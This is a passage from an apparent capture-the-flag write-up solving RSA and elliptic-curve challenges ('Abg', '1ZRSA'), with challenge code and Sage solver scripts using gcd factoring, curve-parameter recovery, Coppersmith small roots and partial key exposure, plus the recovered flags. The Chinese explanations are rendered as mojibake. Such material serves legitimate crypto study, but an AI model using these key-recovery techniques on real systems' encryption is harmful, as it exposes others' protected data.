class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">q1 = <span class="number">2</span>*p1 + s</span><br><span class="line">r1 = <span class="number">2</span>*q1 + s</span><br><span class="line">f1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)*(r1-<span class="number">1</span>)</span><br><span class="line">d1 = inverse(e, f1)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Im_a_fw_that_only_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line"></span><br><span class="line">p2l = <span class="built_in">int</span>((n2 * inverse(s, <span class="number">2</span>^<span class="number">56</span>)) % <span class="number">2</span>^<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">f = gift * <span class="number">2</span>^<span class="number">262</span> + x * <span class="number">2</span>^<span class="number">56</span> + p2l</span><br><span class="line">root = f.monic().small_roots(X=<span class="number">2</span>^(<span class="number">262</span>-<span class="number">56</span>), beta=<span class="number">0.48</span>)</span><br><span class="line"><span class="built_in">print</span>(root)</span><br><span class="line"></span><br><span class="line">p2 = <span class="built_in">int</span>(f(root[<span class="number">0</span>]))</span><br><span class="line">q2 = n2 // p2</span><br><span class="line">f2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse(e, f2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;crafts_RSA_challenges&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š</p><p><code>flag&#123;Im_a_fw_that_only_crafts_RSA_challenges&#125;</code></p><p>â€‹</p><h3 id="Abg"><a href="#Abg" class="headerlink" title="Abg"></a>Abg</h3><blockquote><p>How to obtain abg?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC</span>(<span class="params">bit</span>):</span><br><span class="line"> g = getPrime(bit)</span><br><span class="line"> a = getPrime(bit)</span><br><span class="line"> b = getPrime(bit)</span><br><span class="line"></span><br><span class="line"> E = EllipticCurve(GF(g),[a,b])</span><br><span class="line"> J = E.random_point()</span><br><span class="line"> K = E.random_point()</span><br><span class="line"> L = E.random_point()</span><br><span class="line"></span><br><span class="line"> r = getPrime(bit // <span class="number">2</span>)</span><br><span class="line"> k = getPrime(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"> s  = r * J</span><br><span class="line"> s1 = r * J + k * L</span><br><span class="line"> s2 = r * k * J</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> L.xy(), s.xy(), s1.xy(), s2.xy(), K.xy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RSA</span>(<span class="params">m, s, bit</span>):</span><br><span class="line"> p = getPrime(bit)</span><br><span class="line"> q = getPrime(bit)</span><br><span class="line"> rr = getPrime(bit)</span><br><span class="line"> n = p * q</span><br><span class="line"></span><br><span class="line"> gift = <span class="built_in">pow</span>(rr, rr * (p-<span class="number">1</span>), n)</span><br><span class="line"> enc = <span class="built_in">pow</span>(m, <span class="built_in">int</span>(s), n)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> gift, n, enc</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;--------------------------------&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">L, s, s1, s2, K = ECC(<span class="number">256</span>)</span><br><span class="line">gift, n, enc = RSA(m, <span class="built_in">abs</span>(<span class="built_in">int</span>(s[<span class="number">0</span>] - s[<span class="number">1</span>])), <span class="number">512</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;L =&quot;</span>, L)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s1 =&quot;</span>, s1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s2 =&quot;</span>, s2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;K =&quot;</span>, K)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gift =&quot;</span>, gift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br></pre></td></tr></table></figure></blockquote><p>æ ¹æ® <code>gift = pow(rr, rr * (p-1), n)</code>ï¼Œç”±äº $rr^{p-1} \equiv 1 \pmod p$</p><p>æœ‰ $\text{gift} = rr^{rr(p-1)} \equiv (rr^{p-1})^{rr} \equiv 1 \pmod p$</p><p>æ•… $p \mid (\text{gift} - 1)$ï¼Œå³ $p = \gcd(\text{gift}-1,n)$ï¼Œåˆ†è§£ $n$ã€‚</p><p>ECCå·²çŸ¥å››ä¸ªç‚¹ï¼š<code>L, s1, s2, K</code>ï¼Œå¯¹åº”çš„æ›²çº¿æ˜¯ï¼š</p><p>$E:y^2=x^3+ax+b \pmod g$</p><p>å¯¹æ¯ä¸ªç‚¹ $(x_i,y_i)$ éƒ½æœ‰ï¼š$y_i^2=x_i^3+ax+b \pmod g$</p><p>å°†å³è¾¹ç§»é¡¹å®šä¹‰ï¼š$D_i := y_i^2 - x_i^3 \equiv a x_i + b \pmod g$</p><p>å¯¹äºä¸‰ä¸ªç‚¹ $P_1, P_2, P_3$ï¼ˆå¦‚ $L, s_1, s_2$ï¼‰ï¼Œæ»¡è¶³ï¼š</p><p>$\begin{cases} D_1 \equiv a x_1 + b \pmod g \ D_2 \equiv a x_2 + b \pmod g \ D_3 \equiv a x_3 + b \pmod g \end{cases} $</p><p>å°†ç¬¬ä¸€å¼åˆ†åˆ«ç›¸å‡ï¼š</p><p>$D_2 - D_1 \equiv a(x_2 - x_1) \pmod g$</p><p>$D_3 - D_1 \equiv a(x_3 - x_1) \pmod g$</p><p>æ¶ˆå» $a$ï¼š</p><p>$(D_2 - D_1)(x_3 - x_1) - (D_3 - D_1)(x_2 - x_1) \equiv 0 \pmod g$</p><p>å› æ­¤ $g$ å¿…å®šæ•´é™¤ï¼š</p><p>$N_{123} := (D_2 - D_1)(x_3 - x_1) - (D_3 - D_1)(x_2 - x_1)$</p><p>è‹¥å†é€‰æ‹©å¦ä¸€ç»„ä¸‰ç‚¹ï¼ˆå¦‚ $L, s_1, K$ï¼‰ï¼Œå¯å¾—ç¬¬äºŒä¸ªæ•° $N_{124}$ã€‚å› æ­¤ï¼š</p><p>$g \mid N_{123}, g \mid N_{124}$</p><p>æ‰€ä»¥æ¨¡æ•° $g = \gcd(N_{123}, N_{124})$ã€‚</p><p>æ¥ç€ç”¨ä¸¤ç‚¹ï¼ˆå¦‚ $L, s_1$ï¼‰æ±‚å‚æ•° $a$ ä¸ $b$ï¼š</p><p>$D_1 \equiv a x_1 + b \pmod g$</p><p>$D_2 \equiv a x_2 + b \pmod g$</p><p>ç›¸å‡å¾—ï¼š</p><p>$D_2 - D_1 \equiv a(x_2 - x_1) \pmod g$</p><p>æ±‚é€† $(x_2 - x_1)^{-1} \pmod g$ï¼š</p><p>$a \equiv (D_2 - D_1)(x_2 - x_1)^{-1} \pmod g$</p><p>å†ä»£å…¥å³å¯æ±‚å¾—ï¼š</p><p>$b \equiv D_1 - a x_1 \pmod g$</p><p>å·²çŸ¥ï¼š$L, s_1, s_2$ ï¼ŒæœªçŸ¥ï¼š$s$ å’Œ $k$ï¼ˆå·²çŸ¥ $k$ ä¸º 16-bit ç´ æ•°ï¼š<code>getPrime(16)</code>ï¼‰</p><p>ç”±å…³ç³»ï¼š</p><p>$ \begin{cases}<br>s_1 = s + kL \\<br>s_2 = k s<br>\end{cases} $</p><p>å¯æ¨å‡ºï¼šå¯¹æ­£ç¡®çš„ $k$ï¼Œ</p><p>$ s = s_1 - kL $ ä¸” $ k s = s_2 $ã€‚</p><p>æšä¸¾æ‰€æœ‰ 16-bit ç´ æ•° $k$ï¼ˆèŒƒå›´ $2^{15}\sim 2^{16}$ï¼‰ï¼Œå¯¹æ¯ä¸ªå€™é€‰ $k$ï¼Œå…ˆåœ¨æ¤­åœ†æ›²çº¿ç¾¤ä¸Šè®¡ç®— $kL$ï¼Œè®¡ç®— $S := s_1 - kL$ï¼Œæ£€æŸ¥ $kS \stackrel{?}{=} s_2$ã€‚è‹¥ç­‰å¼æˆç«‹ï¼Œåˆ™è¯¥ $k$ ä¸ºæ­£ç¡®çš„ç´ æ•°ï¼Œä¸”å¯¹åº”çš„ $S$ å³ä¸ºæ‰€æ±‚ç‚¹ $s$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.matrix.matrix2 <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix.determinant(f1.sylvester_matrix(f2, var))</span><br><span class="line"></span><br><span class="line">L = (<span class="number">5612832632021037413595021905856059690922175615680426850888866965067320107819</span>, <span class="number">44286844991960812568914524464365492264373223903614475371204877844888511445056</span>)</span><br><span class="line">s1 = (<span class="number">3105425529931638108939225244969805843864193431777172585017902596003213488900</span>, <span class="number">21204057924591170352686471525538286905154747896755584173932333298433282086561</span>)</span><br><span class="line">s2 = (<span class="number">17163600514231693116809112204202083823354850361231568034507586407851022654385</span>, <span class="number">54523130652066750636213932541583111123904814992668862332727980305098543395332</span>)</span><br><span class="line">K = (<span class="number">84626796737477467367556465702814556148204747766624017939626441693356336891461</span>, <span class="number">20412858373065309258609569831347478221615957387864164638932871773748933195219</span>)</span><br><span class="line">enc = <span class="number">77779248799562415787538731320739960822457760506615718084036279480880899171418681853821326436404494983875803921684003465855970542931724878457768817162166413967384579329072032251210520838992258491716245608876204830909672245330785235016998427930933850050898878548191256398496024681498083646200326639489612460844</span></span><br><span class="line">gift = <span class="number">27203859362379532209762716293585970661584968016465564915669656593570376250661463300469214869975225133883120425672896040102408082124157996563344160198308488970094544684114508100388704667496464400261830996514109943777210955076236899363247079300339008914936852187908757699066223721473477803084358704291887973927</span></span><br><span class="line">n = <span class="number">99350851709648177478181442570691890135193362203180628334780894515389735176666242281991349782055218048443285160186921692026870729324336754641181928398906259668775047724023372863155472201773397077316170491389813660679924150036914095032544796724427607899057109320556570067643629947815982002736525967748207154359</span></span><br><span class="line"></span><br><span class="line">p = GCD(gift-<span class="number">1</span>, n)</span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">(x1,y1),(x2,y2),(x3,y3),(x4,y4) = L,s1,s2,K</span><br><span class="line"></span><br><span class="line">PR.&lt;a,b,g,k1,k2,k3,k4&gt; = PolynomialRing(ZZ)</span><br><span class="line">f1 = (y1^<span class="number">2</span>+k1*g)-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">f2 = (y2^<span class="number">2</span>+k2*g)-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">f3 = (y3^<span class="number">2</span>+k3*g)-(x3^<span class="number">3</span>+a*x3+b)</span><br><span class="line">f4 = (y4^<span class="number">2</span>+k4*g)-(x4^<span class="number">3</span>+a*x4+b)</span><br><span class="line">g1 = resultant(f1, f2, b)</span><br><span class="line">g2 = resultant(f2, f3, b)</span><br><span class="line">g3 = resultant(f3, f4, b)</span><br><span class="line">h1 = resultant(g1, g2, a)</span><br><span class="line">h2 = resultant(g2, g3, a)</span><br><span class="line">g_gcd = gcd(h1(g=<span class="number">0</span>),h2(g=<span class="number">0</span>))</span><br><span class="line">g = <span class="built_in">list</span>(<span class="built_in">zip</span>(*factor(g_gcd)))[<span class="number">0</span>][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">PR.&lt;a,b&gt; = PolynomialRing(Zmod(g))</span><br><span class="line">f1 = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">f2 = y2^<span class="number">2</span>-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">gg = resultant(f1, f2, b)</span><br><span class="line">a = gg.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">b = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(g),[a,b])</span><br><span class="line">L, s1, s2, K = E(L), E(s1), E(s2), E(K)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">2</span>^<span class="number">15</span>, <span class="number">2</span>^<span class="number">16</span>):</span><br><span class="line">    S = s1 - k * L</span><br><span class="line">    <span class="keyword">if</span> k * S == s2:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        e = <span class="built_in">int</span>(S.xy()[<span class="number">0</span>] - S.xy()[<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, f)</span><br><span class="line">m = <span class="built_in">pow</span>(enc, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;this_1s_a_so_EZ_Ecc_and_RSA_&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="1ZRSA"><a href="#1ZRSA" class="headerlink" title="1ZRSA"></a>1ZRSA</h3><blockquote><p>How to restore d?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RSA</span>(<span class="params">m,nbit</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     p, q, e = getPrime(nbit), getPrime(nbit), getPrime(nbit)</span><br><span class="line">     n = p * q</span><br><span class="line">     phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">     d = <span class="built_in">int</span>(inverse(e, phi_n))</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(d)[<span class="number">2</span>:]) == <span class="number">1024</span>:</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"> keep_bits = nbit * <span class="number">2</span> - <span class="number">100</span></span><br><span class="line"> mask = <span class="built_in">int</span>((<span class="number">1</span> &lt;&lt; keep_bits) - <span class="number">1</span>)</span><br><span class="line"> d_ = d &amp; mask</span><br><span class="line"> c = powmod(m, e, n)</span><br><span class="line"> <span class="keyword">return</span> c,n,e,d_</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">nbit</span>):</span><br><span class="line"></span><br><span class="line"> c, n, e, d_ = RSA(m, nbit)</span><br><span class="line"> N = getPrime(nbit * <span class="number">2</span>)</span><br><span class="line"> t = random.randint(<span class="number">1</span>, nbit * <span class="number">2</span> - <span class="number">1</span>)</span><br><span class="line"> C = [random.randint(<span class="number">0</span>, N - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t - <span class="number">1</span>)] + [powmod(d_,<span class="number">1</span>,N)]</span><br><span class="line"> R.&lt;x&gt; = GF(N)[]</span><br><span class="line"> f = R(<span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">     f += x ** (t - i - <span class="number">1</span>) * C[i]</span><br><span class="line"> enc = [(a, f(a)) <span class="keyword">for</span> a <span class="keyword">in</span> [random.randint(<span class="number">1</span>, N - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t)]]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">     f_out.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">     f_out.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">     f_out.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">     f_out.write(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>\n&quot;</span>)</span><br><span class="line">     f_out.write(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;-------------------------------&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> gen(<span class="number">512</span>)</span><br></pre></td></tr></table></figure></blockquote><p>å…ˆåˆ©ç”¨æ‹‰æ ¼æœ—æ—¥æ’å€¼å¾—åˆ° $d_$ï¼Œåˆ™æœ‰ï¼š</p><p>$d_ = d \bmod {2^{924}} = d \bmod M$</p><p>å·²çŸ¥ $d$ çš„ä½924 bitï¼Œé«˜100 bitæœªçŸ¥ï¼Œå‚è€ƒpaperæ¢å¤ $d$ï¼š</p><p><a target="_blank" rel="noopener" href="https://iacr.org/archive/crypto2003/27290027/27290027.pdf">New Partial Key Exposure Attacks on RSA</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c = <span class="number">20097917975976244212804495505547378775192697398757852484470663134292303338857813665427361475291839742701897692021592768951337369359985753899758460501082688892433601859784370235024490582627653300910319966427446071365231403886401758454373421473918864377545067414137734340957459701356880555429257775991389025605</span></span><br><span class="line">n = <span class="number">116376326770473527049297745034424462379146540284343756148846306622695296997431548050079546989704848420774223823859722342721901422673100171517517663819430028774766695507474117022650117032173924418637376020646651244829309484447907193865089742989345611248697678364992258804991818299681579581902368620867953336499</span></span><br><span class="line">e = <span class="number">10353694792561707194043837777206399577514261278666517806783493423529968409432319317990981551349605049769644936765011036794341868203823088183868588952187757</span></span><br><span class="line">N = <span class="number">115408813468861281960898054657552253267239936634919735418599412235150663863228300311815071234925575799509694622324123385471137211728599972610452147428215161591420553224869213121337347045839044267723861662664273446685648591183391110699976950230645871945929809369143931450528289820037276983408630296615824828213</span></span><br><span class="line">enc = [...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">product</span>(<span class="params">vals, p</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y % p, vals)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lagrange_interpolate</span>(<span class="params">x, x_s, y_s, p</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(x_s)</span><br><span class="line">    <span class="keyword">assert</span> n == <span class="built_in">len</span>(<span class="built_in">set</span>(x_s))  <span class="comment"># x_s must be distinct</span></span><br><span class="line">    num = []</span><br><span class="line">    den = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        others = x_s[:i] + x_s[i+<span class="number">1</span>:]</span><br><span class="line">        num.append(product((x - o <span class="keyword">for</span> o <span class="keyword">in</span> others), p))</span><br><span class="line">        den.append(product((x_s[i] - o <span class="keyword">for</span> o <span class="keyword">in</span> others), p))</span><br><span class="line">    dens = product(den, p)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tmp1 = ((num[i] * dens % p) * y_s[i]) % p</span><br><span class="line">        tmp2 = tmp1 * gmpy2.invert(den[i], p) % p</span><br><span class="line">        res = (res + tmp2) % p </span><br><span class="line">    res = res * gmpy2.invert(dens, p) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shamir_sharing_encode</span>(<span class="params">s, k, n, p</span>):</span><br><span class="line">    a = [getRandomInteger(Nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k-<span class="number">1</span>)]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x = getRandomInteger(Nbits)</span><br><span class="line">        fx = s</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k-<span class="number">1</span>):</span><br><span class="line">            fx = (fx + a[i] * <span class="built_in">pow</span>(x, i+<span class="number">1</span>, p)) % p</span><br><span class="line">        res.append((x, fx))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shamir_sharing_decode</span>(<span class="params">shares, p</span>):</span><br><span class="line">    x_s, y_s = <span class="built_in">zip</span>(*shares)</span><br><span class="line">    <span class="keyword">return</span> lagrange_interpolate(<span class="number">0</span>, x_s, y_s, p)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">d_ = shamir_sharing_decode(enc, N)</span><br><span class="line"><span class="built_in">print</span>(d_)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://iacr.org/archive/crypto2003/27290027/27290027.pdf</span></span><br><span class="line"></span><br><span class="line">M = <span class="number">2</span>^<span class="number">924</span></span><br><span class="line">ebits = e.nbits()</span><br><span class="line"></span><br><span class="line">alpha = ebits / <span class="number">1024</span></span><br><span class="line">Y = <span class="built_in">int</span>(n**alpha)</span><br><span class="line">Z = <span class="built_in">int</span>(<span class="number">3</span> * n**<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="number">6</span></span><br><span class="line">t = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">poly = []</span><br><span class="line">monomials = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">PR.&lt;y, z&gt; = PolynomialRing(ZZ)</span><br><span class="line">y, z = PR.gens()</span><br><span class="line"></span><br><span class="line">f = 